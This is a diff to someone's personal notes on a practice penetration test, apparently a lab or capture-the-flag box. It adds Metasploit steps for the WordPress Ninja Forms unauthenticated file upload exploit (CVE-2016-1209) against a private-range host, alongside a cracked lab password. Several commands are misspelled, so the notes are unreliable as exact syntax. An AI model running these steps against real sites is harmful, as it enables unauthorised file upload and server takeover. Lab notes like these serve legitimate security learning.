@@ -1,7 +1,7 @@
 
 running kalix linux
 
-sudo systemctl start postrgersql
+sudo systemctl start postgresql
 
 systemctl status postgresql
 
@@ -72,7 +72,23 @@ look into `/usr/share/wordlists`
 
 password should be `cherry`
 
-////
+------
+
+lets hack
+
+exploit / run -sysinfo -shell -whoam
+
+* msfconsole
+* use expont/multi/http/wp_ninja/forms/unauthenticated_file_upload
+* search CVE-2016-1209 / use 0
+* show options
+* set rhost 192.168.1.42
+* set rport 8585
+* set TARGETURI /wordpress/
+* set FORM_PATH /index.php/king-of-hearts/
+
+-----
+
 
 
 
